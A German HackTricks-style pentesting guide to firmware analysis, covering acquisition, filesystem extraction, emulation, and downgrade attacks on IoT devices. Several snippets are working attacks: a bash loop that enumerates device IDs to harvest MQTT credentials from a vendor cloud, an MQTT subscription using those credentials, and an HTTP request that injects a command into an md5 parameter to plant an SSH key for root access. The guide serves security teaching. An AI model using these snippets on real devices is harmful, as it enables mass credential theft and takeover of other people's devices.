# Firmware Analyse

{{#include ../../banners/hacktricks-training.md}}

## **Einführung**

### Verwandte Ressourcen


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Firmware ist essentielle Software, die Geräte korrekt betreibt, indem sie die Kommunikation zwischen Hardwarekomponenten und der Software, mit der Benutzer interagieren, verwaltet und ermöglicht. Sie ist im permanenten Speicher abgelegt, sodass das Gerät von dem Moment an auf wichtige Anweisungen zugreifen kann, in dem es eingeschaltet wird, und so das Betriebssystem gestartet wird. Die Untersuchung und gegebenenfalls Modifikation der Firmware ist ein kritischer Schritt zur Identifizierung von Sicherheitslücken.

## **Informationsbeschaffung**

**Informationsbeschaffung** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die verwendeten Technologien zu verstehen. Dieser Prozess umfasst das Sammeln von Daten über:

- Die CPU-Architektur und das Betriebssystem, auf dem es läuft
- Bootloader-Spezifika
- Hardware-Layout und Datenblätter
- Codebasis-Metriken und Quellstandorte
- Externe Bibliotheken und Lizenztypen
- Update-Historien und regulatorische Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence (OSINT)**-Tools unschätzbar, ebenso wie die Analyse verfügbarer Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfprozesse. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, die genutzt werden können, um potenzielle Probleme zu finden.

## **Beschaffung der Firmware**

Das Beschaffen von Firmware kann auf verschiedenen Wegen erfolgen, die jeweils unterschiedliche Komplexität aufweisen:

- **Direkt** vom Anbieter (Entwickler, Hersteller)
- **Selbst erstellen** anhand der bereitgestellten Anweisungen
- **Herunterladen** von offiziellen Support-Seiten
- Nutzung von **Google dork**-Queries, um gehostete Firmware-Dateien zu finden
- Direkter Zugriff auf **Cloud-Speicher**, z. B. mit Tools wie [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Abfangen von **Updates** mittels man-in-the-middle-Techniken
- **Extrahieren** vom Gerät über Verbindungen wie **UART**, **JTAG** oder **PICit**
- **Sniffing** nach Update-Anfragen innerhalb der Gerätekommunikation
- Identifizieren und Verwenden von **hardcoded update endpoints**
- **Dumping** aus dem Bootloader oder Netzwerk
- **Entfernen und Auslesen** des Speicherschips, wenn alles andere fehlschlägt, mit geeigneten Hardware-Tools

## Analyse der Firmware

Nun, da Sie die **Firmware** haben, müssen Sie Informationen daraus extrahieren, um zu wissen, wie Sie vorgehen. Verschiedene Tools, die Sie dafür verwenden können:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`: Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du diese Tools verwenden, um **Dateien zu extrahieren, die im Firmware-Image eingebettet sind**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), um die Datei zu untersuchen.

### Zugriff auf das Dateisystem

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du in der Lage gewesen sein, das **Dateisystem zu extrahieren**.\
Binwalk extrahiert es normalerweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**, der üblicherweise einer der folgenden ist: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Extraktion des Dateisystems

Manchmal hat binwalk **nicht das Magic-Byte des Dateisystems in seinen Signaturen**. In diesen Fällen verwende binwalk, um den **Offset des Dateisystems zu finden und das komprimierte Dateisystem aus dem Binary zu carve** und das Dateisystem entsprechend seinem Typ **manuell zu extrahieren**, indem du die folgenden Schritte befolgst.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Führe den folgenden **dd command** aus, um das Squashfs filesystem zu carving.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativ könnte auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- Für CPIO-Archive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu zerlegen, um ihre Struktur und mögliche Schwachstellen zu verstehen. Dieser Prozess beinhaltet den Einsatz verschiedener Tools, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Erste Analysetools

Eine Reihe von Befehlen wird für die erste Untersuchung der Binärdatei (als `<bin>` bezeichnet) bereitgestellt. Diese Befehle helfen dabei, Dateitypen zu identifizieren, Strings zu extrahieren, binäre Daten zu analysieren und Details zu Partitionen und Dateisystemen zu verstehen:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Niedrige Entropie deutet auf fehlende Verschlüsselung hin, während hohe Entropie auf mögliche Verschlüsselung oder Kompression hindeutet.

Zum Extrahieren von **eingebetteten Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiansicht empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` lässt sich das Dateisystem normalerweise extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** jedoch den Dateisystemtyp aufgrund fehlender Magic-Bytes nicht erkennt, ist eine manuelle Extraktion notwendig. Dabei verwendet man `binwalk`, um den Offset des Dateisystems zu finden, gefolgt vom `dd`-Befehl, um das Dateisystem herauszuschneiden:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um den Inhalt manuell zu extrahieren.

### Dateisystem-Analyse

Nachdem das Dateisystem extrahiert wurde, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere network daemons, hardcoded credentials, API endpoints, Update-Server-Funktionalitäten, uncompiled code, startup scripts und kompilierte binaries für die Offline-Analyse geachtet.

**Wichtige Orte** und **Elemente**, die zu prüfen sind, umfassen:

- **etc/shadow** und **etc/passwd** für user credentials
- SSL-Zertifikate und Keys in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binaries zur weiteren Analyse
- Gängige IoT-Geräte-Webserver und Binaries

Mehrere Tools helfen dabei, sensible Informationen und Schwachstellen im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) für die Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analyse

### Sicherheitsprüfungen an kompilierten Binaries

Sowohl Quellcode als auch im Dateisystem gefundene kompilierte Binaries müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binaries und **PESecurity** für Windows-Binaries helfen dabei, ungeschützte Binaries zu identifizieren, die ausgenutzt werden könnten.

## Gewinnung von cloud config und MQTT credentials über abgeleitete URL-Token

Viele IoT-Hubs holen ihre pro-Gerät-Konfiguration von einem Cloud-Endpunkt, der wie folgt aussieht:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Während der Firmware-Analyse kann man feststellen, dass <token> lokal aus der deviceId unter Verwendung eines hardcoded secret abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dieses Design ermöglicht es jedem, der deviceId und STATIC_KEY kennt, die URL zu rekonstruieren und die cloud config abzurufen, was häufig plaintext MQTT credentials und topic prefixes offenlegt.

Praktischer Workflow:

1) deviceId aus UART-Boot-Logs extrahieren

- Verbinde einen 3.3V UART-Adapter (TX/RX/GND) und zeichne Logs auf:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Suchen Sie nach Zeilen, die das cloud config URL pattern und die broker address ausgeben, zum Beispiel:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) STATIC_KEY und Token-Algorithmus aus der Firmware ermitteln

- Lade Binaries in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder nach MD5-Verwendung.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite den Token in Bash ab und wandle den Digest in Großbuchstaben um:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Sammle cloud config und MQTT credentials

- Stelle die URL zusammen und hole JSON mit curl; parse mit jq, um secrets zu extrahieren:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Missbrauch von plaintext MQTT und schwachen topic ACLs (falls vorhanden)

- Verwende recovered credentials, um maintenance topics zu abonnieren und nach sensitive events zu suchen:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (in großem Maßstab, mit Autorisierung)

- Viele Ökosysteme betten vendor OUI/product/type bytes ein, gefolgt von einem fortlaufenden Suffix.
- Du kannst candidate IDs iterieren, tokens ableiten und configs programmgesteuert abrufen:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Hole immer eine ausdrückliche Autorisierung ein, bevor du mass enumeration versuchst.
- Bevorzuge emulation oder static analysis, um secrets wiederherzustellen, ohne die Zielhardware zu verändern, wenn möglich.

Der Prozess, Firmware zu emulieren, ermöglicht **dynamic analysis**, entweder der Funktionsweise eines Geräts oder eines einzelnen Programms. Dieser Ansatz kann auf Probleme mit Hardware- oder Architekturabhängigkeiten stoßen, aber das Übertragen des root filesystem oder bestimmter binaries auf ein Gerät mit passender Architektur und Endianness, wie z. B. einen Raspberry Pi, oder auf eine vorkonfigurierte virtuelle Maschine kann weitere Tests erleichtern.

### Emulating Individual Binaries

Für die Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu bestimmen.

#### Example with MIPS Architecture

Um ein MIPS-architecture binary zu emulieren, kann man den Befehl verwenden:
```bash
file ./squashfs-root/bin/busybox
```
Und um die notwendigen Emulationstools zu installieren:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

Bei ARM-Binaries ist der Prozess ähnlich; der Emulator `qemu-arm` wird zur Emulation verwendet.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

In diesem Stadium wird entweder eine reale oder emulierte Geräteumgebung zur Analyse verwendet. Es ist wichtig, Shell-Zugriff auf das OS und das Dateisystem sicherzustellen. Emulation bildet Hardware-Interaktionen nicht immer perfekt ab, weshalb gelegentliche Neustarts der Emulation nötig sein können. Die Analyse sollte das Dateisystem erneut untersuchen, exponierte Webseiten und Netzwerkdienste ausnutzen und Bootloader-Schwachstellen erkunden. Firmware-Integritätstests sind entscheidend, um mögliche Backdoor-Schwachstellen zu identifizieren.

## Runtime Analysis Techniques

Laufzeitanalyse bedeutet, mit einem Prozess oder Binary in seiner Laufzeitumgebung zu interagieren, dabei Tools wie gdb-multiarch, Frida und Ghidra zu verwenden, um Breakpoints zu setzen und Schwachstellen durch Fuzzing und andere Techniken zu identifizieren.

## Binary Exploitation and Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in niedrigeren Sprachen. Binary-Laufzeitschutzmechanismen in Embedded-Systemen sind selten, aber falls vorhanden, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

## Prepared Operating Systems for Firmware Analysis

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests und sind mit den notwendigen Tools ausgestattet.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distro, die Ihnen hilft, Sicherheitsbewertungen und Penetrationstests von Internet of Things (IoT)-Geräten durchzuführen. Sie spart viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen notwendigen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selbst wenn ein Hersteller kryptographische Signaturprüfungen für Firmware-Images implementiert, wird häufig der Schutz gegen Version-Rollback (Downgrade) ausgelassen. Wenn der Boot- oder Recovery-Loader nur die Signatur mit einem eingebetteten öffentlichen Schlüssel überprüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer legal eine **ältere, verwundbare Firmware installieren, die noch eine gültige Signatur trägt**, und damit gepatchte Schwachstellen wieder einführen.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In der verwundbaren (auf eine ältere Version zurückgesetzten) Firmware wird der `md5`-Parameter direkt in einen shell-Befehl ohne Eingabevalidierung eingefügt, wodurch die Injektion beliebiger Befehle möglich wird (hier – ermöglicht SSH key-based root access). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, aber das Fehlen eines Downgrade-Schutzes macht die Korrektur wirkungslos.

### Extrahieren von Firmware aus mobilen Apps

Viele Hersteller packen vollständige Firmware-Images in ihre Begleit-Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete werden häufig unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` abgelegt. Tools wie `apktool`, `ghidra` oder sogar simples `unzip` ermöglichen es, signierte Images zu extrahieren, ohne die physische Hardware zu berühren.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpunkts* ausreichend geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**, bevor geflasht wird?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. Signaturen, die vom ROM-Code überprüft werden)?
* Führt der Userland-Code zusätzliche Plausibilitätsprüfungen durch (z. B. erlaubte Partitionstabelle, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Flows dieselbe Validierungslogik?

> 💡  Wenn eines der oben genannten fehlt, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, nutzen Sie die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Training und Zertifizierung

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
